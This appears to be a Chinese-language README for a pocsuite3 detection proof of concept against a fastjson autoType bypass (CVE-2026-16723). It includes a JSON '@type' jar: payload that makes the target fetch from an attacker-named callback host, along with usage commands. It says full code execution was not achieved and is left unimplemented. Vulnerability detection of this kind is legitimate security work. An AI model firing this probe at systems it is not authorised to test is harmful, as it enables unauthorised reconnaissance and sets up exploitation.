# Fastjson CVE-2026-16723 检测 PoC

fastjson 1.2.68–1.2.83 默认配置远程代码执行（CVE-2026-16723）的**检测** PoC，
pocsuite3 格式。

> ⚠️ 本 PoC **仅支持检测（`--verify`）**，不实现完整 RCE。原因见下文
> [实验限制](#实验限制rce-未验证)。

## 漏洞说明

| 项 | 值 |
|----|----|
| CVE | CVE-2026-16723 |
| 受影响版本 | fastjson `1.2.68 - 1.2.83`（默认配置） |
| 类型 | RCE（checkAutoType 绕过） |
| 官方 advisory | [fastjson2 wiki Security Advisory](https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83) |

fastjson 的 `checkAutoType` 会把 `@type` 指定的 typeName 经
`typeName.replace('.', '/')` 转成资源路径，再调用 `getResourceAsStream` 探测。
当 typeName 是 `jar:http://<host>:<port>/xxx.jar!/Cls` 形式时，类加载器
（Spring Boot 的 `LaunchedURLClassLoader`）会**主动向攻击者发起 HTTP GET**
拉取该 jar——这就是可观测的带外信号。

## 检测机制（本 PoC）

本 PoC 采用编排方实验验证的 **HTTP 回连（out-of-band callback）** 检测法：

1. 本地起一个 HTTP 监听（`ThreadingHTTPServer`），记录任意路径收到的 GET；
2. 向目标 POST：
   ```json
   {"@type":"jar:http://<callback_host>:<port>/probe.jar!/EvilPayload"}
   ```
3. 轮询监听器；若在 ~15s 内收到 GET，判定为**存在漏洞**；
4. `finally` 中关闭监听（`shutdown()` + `server_close()`），不留孤儿线程/端口。

**关键：检测只看监听器是否收到 GET，不看目标响应体。** 无论回连成功与否，
目标响应都是 `autoType is not support. jar:...`（HTTP 200 + JSON error），
响应内容不可判定。

### 关键约束（编排方实验验证，勿重新调查）

1. **callback host 必须无点**：fastjson `replace('.', '/')` 会把 URL 里**所有点**
   替换成斜杠——`192.168.1.5` → `192/168/1/5`、`host.docker.internal` →
   `host/docker/internal`，含点 host 的请求**永远发不出去**（DNS 解析失败）。
   必须使用无点主机名（Docker 服务名 / 内网 DNS 主机名 / `socket.gethostname()`
   的点前部分）。
2. **请求路径被改写**：`probe.jar` 也被替换成 `probe/jar`——监听器在**任意路径**
   响应即可（本 PoC 不关心路径，只看是否收到 GET）。
3. **响应不可判定**：见上文，检测只靠回连。
4. **nuclei 不可覆盖**：nuclei interactsh OAST 域名含点，同样被 replace 破坏，
   属于 nuclei 无法覆盖的典型，故归本 POC 仓库。

## 用法

```bash
# 检测模式（默认 callback_host = 本机无点主机名，端口随机）
pocsuite3 -r pocsuite3/fastjson/cve_2026_16723_detect_poc.py -u http://<target>

# 指定无点回连主机名（目标可达攻击者的名字，例如 Docker 服务名）
pocsuite3 -r pocsuite3/fastjson/cve_2026_16723_detect_poc.py -u http://<target> \
    --callback_host attacker

# 指定固定监听端口（默认 0 = 随机）
pocsuite3 -r pocsuite3/fastjson/cve_2026_16723_detect_poc.py -u http://<target> \
    --callback_host attacker --callback_port 8888
```

### `callback_host` 怎么填

`callback_host` 是**目标用来回连攻击者监听器**的主机名，**必须无点**：

| 场景 | 推荐值 |
|------|--------|
| Docker（PoC 与靶机同一 compose 网络） | Docker 服务名，如 `attacker` |
| 内网直连 | 内网 DNS 主机名，如 `kali` |
| 不确定 | `socket.gethostname().split('.')[0]`（默认值，取主机名的点前部分） |

⚠️ **不要填 IP 或带点的域名**（如 `192.168.1.5`、`host.docker.internal`）——
fastjson 会把点替换成斜杠，请求发不出去。若误填，PoC 会打印 warning 提示。

监听器绑定 `0.0.0.0`，因此本机所有网卡均可被回连；`callback_host` 只决定
**payload 里写哪个名字**让目标能解析到本机。

## 实验限制（RCE 未验证）

编排方在真实 fastjson 1.2.83 + Spring Boot fat-jar + JDK8 靶场实验确认：

- ✅ **jar 可被拉取**：监听器收到 GET 200（即本 PoC 检测的信号）；
- ❌ **完整 RCE 走不通**：`URLClassPath.findClass` 处理 `jar:` URL 的类名后，
  `defineClass` 的类名与字节码不匹配（JVM `Wrong name`），`loadClass` 失败。

官方 advisory 声称的端到端 RCE 存在**未公开前提**（可能特定 Spring Boot/JDK 版本
组合）。因此本 PoC 的 `_attack` / `_shell` **不实现利用**，并如实标注原因，
禁止编造利用能力。当前仅支持检测模式（`--verify`）。

## 文件清单

| 文件 | 漏洞编号 | 类型 | 说明 |
|------|---------|------|------|
| `cve_2026_16723_detect_poc.py` | CVE-2026-16723 | 检测（OOB HTTP callback） | jar: 资源探测回连检测；`_attack`/`_shell` 如实标注未实现 |

## 参考

- https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83
- https://nvd.nist.gov/vuln/detail/CVE-2026-16723
